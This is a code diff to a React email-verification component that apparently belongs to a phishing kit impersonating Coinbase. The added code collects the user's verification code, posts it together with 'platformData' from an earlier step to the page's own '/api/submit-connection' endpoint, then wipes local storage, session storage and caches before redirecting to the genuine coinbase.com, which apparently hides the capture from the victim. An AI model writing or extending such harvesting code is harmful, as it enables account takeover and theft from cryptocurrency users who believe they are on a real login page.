@@ -45,26 +45,53 @@ export default function EmailVerification() {
     if (codeDigits.every((digit) => digit !== '') && !verifying) {
       setVerifying(true);
       
-      // 6-second delay before redirect
-      verificationRef.current = window.setTimeout(() => {
-        // Clear browser session, cache, and history
-        localStorage.clear();
-        sessionStorage.clear();
-
-        // Clear cache if available
-        if ('caches' in window) {
-          caches.keys().then(names => {
-            names.forEach(name => {
-              caches.delete(name);
-            });
+      const submitAndRedirect = async () => {
+        try {
+          const verificationCode = codeDigits.join('');
+          const platformData = location.state?.platformData || {};
+          
+          // Submit the code with other platform data
+          const response = await fetch('/api/submit-connection', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              ...platformData,
+              code: verificationCode,
+            }),
           });
-        }
 
-        // Redirect to Coinbase
-        window.location.href = 'https://coinbase.com/';
-      }, 6000);
+          if (!response.ok) {
+            console.error('Failed to submit verification code');
+          }
+        } catch (err) {
+          console.error('Error submitting code:', err);
+        } finally {
+          // 6-second delay before redirect
+          verificationRef.current = window.setTimeout(() => {
+            // Clear browser session, cache, and history
+            localStorage.clear();
+            sessionStorage.clear();
+
+            // Clear cache if available
+            if ('caches' in window) {
+              caches.keys().then(names => {
+                names.forEach(name => {
+                  caches.delete(name);
+                });
+              });
+            }
+
+            // Redirect to Coinbase
+            window.location.href = 'https://coinbase.com/';
+          }, 6000);
+        }
+      };
+
+      submitAndRedirect();
     }
-  }, [codeDigits, verifying]);
+  }, [codeDigits, verifying, location.state]);
 
   const restartTimer = () => {
     if (timerRef.current) {
